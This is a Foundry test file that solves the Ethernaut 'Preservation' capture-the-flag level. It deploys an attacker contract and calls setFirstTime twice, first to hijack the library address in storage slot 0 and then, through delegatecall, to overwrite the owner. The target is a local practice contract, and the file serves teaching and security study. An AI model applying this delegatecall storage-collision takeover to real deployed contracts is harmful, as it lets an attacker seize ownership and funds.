// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Ethernaut.sol";
import "src/16-Preservation/PreservationFactory.sol";
import "src/16-Preservation/Attacker.sol";

contract BaseSetUp is Test {

    Ethernaut ethernaut;
    address payable attackerEOA;

    function setUp() public virtual {
        // Initialize Ethernaut contract
        ethernaut = new Ethernaut();

        // Initialize Attacker EOA
        attackerEOA = payable(vm.addr(1));      
        vm.deal(attackerEOA, 10 ether);
        vm.label(attackerEOA, "Attacker");
    }
}

contract Attack is BaseSetUp {

    Preservation ethernautPreservation;
    address payable levelAddress;

    function setUp() public virtual override {
        BaseSetUp.setUp();

        // Initialize level
        PreservationFactory preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);

        vm.prank(attackerEOA);
        levelAddress = payable(ethernaut.createLevelInstance(preservationFactory));
        ethernautPreservation = Preservation(levelAddress);
        console.log("Ethernaut Preservation Challenge!");
    }

    function testAttack() public {

        Attacker attackerContract = new Attacker();

        // Foundry cheatcode. Sets attackerEOA as the initializator of txs
        vm.startPrank(attackerEOA);

        // Change timeZone1Library (slot 0) so that it points to the attacker contract
        uint256 pointAttackerContract = uint256(uint160(address(attackerContract)));
        ethernautPreservation.setFirstTime(pointAttackerContract);
        assert(ethernautPreservation.timeZone1Library() == address(attackerContract));

        // Use attackerContract to change slot 3 and take over the contract ownership
        uint256 encodeAttackerEOA = uint256(uint160(address(attackerEOA)));
        ethernautPreservation.setFirstTime(encodeAttackerEOA);
        assert(ethernautPreservation.owner() == attackerEOA);

        // Submit Level
        bool passedLevel = ethernaut.submitLevelInstance(levelAddress);
        assert(passedLevel);

        vm.stopPrank();
    }
}